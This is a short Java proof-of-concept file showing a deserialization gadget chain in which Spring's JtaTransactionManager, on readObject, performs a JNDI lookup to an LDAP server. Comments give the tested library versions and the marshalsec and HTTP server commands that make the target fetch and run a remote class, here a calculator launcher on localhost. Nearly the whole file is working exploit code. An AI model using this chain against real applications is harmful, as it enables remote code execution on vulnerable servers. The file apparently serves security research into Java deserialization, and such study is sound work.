package com.xiinnn.readobject2jndi;

import org.springframework.transaction.jta.JtaTransactionManager;
import java.io.*;

// JtaTransactionManager#readObject -> JNDI
// 依赖实测: spring-tx#3.1.0.RELEASE jta#1.1
// java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec/jndi/LDAPRefServer "http://127.0.0.1:12345/#Calc" 6666
// python3 -m http.server -b 0.0.0.0 12345
public class JTAReadObject2JNDI {
    public static void main(String[] args) throws Exception{
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://127.0.0.1:6666/xxx");

        unserialize(serialize(jtaTransactionManager));
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
